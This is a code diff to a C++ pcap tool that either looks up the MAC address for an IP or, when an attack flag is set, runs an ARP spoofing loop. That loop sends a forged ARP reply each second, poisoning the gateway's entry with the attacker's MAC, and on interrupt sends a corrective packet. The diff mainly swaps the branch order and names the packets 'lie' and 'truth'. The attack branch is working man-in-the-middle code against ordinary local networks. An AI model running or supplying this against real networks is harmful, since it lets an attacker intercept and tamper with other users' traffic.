@@ -28,28 +28,30 @@ int main(int argc, char *argv[])
     pcap_t *handle = transport::open_adaptor(apt);
     std::shared_ptr<void> handle_guard(nullptr, [&](void *) { pcap_close(handle); });
 
-    if (FLAGS_attack) {
+    if (!FLAGS_attack) {
+        mac mac_;
+        if (transport::ip2mac(handle, ip, mac_)) {
+            std::cout << ip.to_str() << " is at " << mac_.to_str() << "." << std::endl;
+        } else {
+            std::cout << ip.to_str() << " is offline." << std::endl;
+        }
+    } else {
         signal(SIGINT, on_interrupt);
         mac gateway_mac;
         if (transport::ip2mac(handle, apt.gateway, gateway_mac)) {
             LOG(INFO) << "gateway " << apt.gateway.to_str() << " is at " << gateway_mac.to_str();
         }
         LOG(INFO) << "forging gateway's mac to " << apt.mac_.to_str() << "...";
+        auto lie = packet::arp(apt.mac_, apt.gateway, apt.mac_, apt.ip, true);
         while (!end_attack) {
-            transport::send(handle, packet::arp(apt.mac_, apt.gateway, apt.mac_, apt.ip, true));
+            transport::send(handle, lie);
             std::this_thread::sleep_for(std::chrono::milliseconds(1000));
         }
         LOG(INFO) << "attack stopped";
         if (transport::ip2mac(handle, apt.gateway, gateway_mac, false)) {
-            transport::send(handle, packet::arp(gateway_mac, apt.gateway, apt.mac_, apt.ip, true));
+            auto truth = packet::arp(gateway_mac, apt.gateway, apt.mac_, apt.ip, true);
+            transport::send(handle, truth);
             LOG(INFO) << "gateway's mac restored to " << gateway_mac.to_str();
-        }
-    } else {
-        mac mac_;
-        if (transport::ip2mac(handle, ip, mac_)) {
-            std::cout << ip.to_str() << " is at " << mac_.to_str() << "." << std::endl;
-        } else {
-            std::cout << ip.to_str() << " is offline." << std::endl;
         }
     }
     NT_CATCH
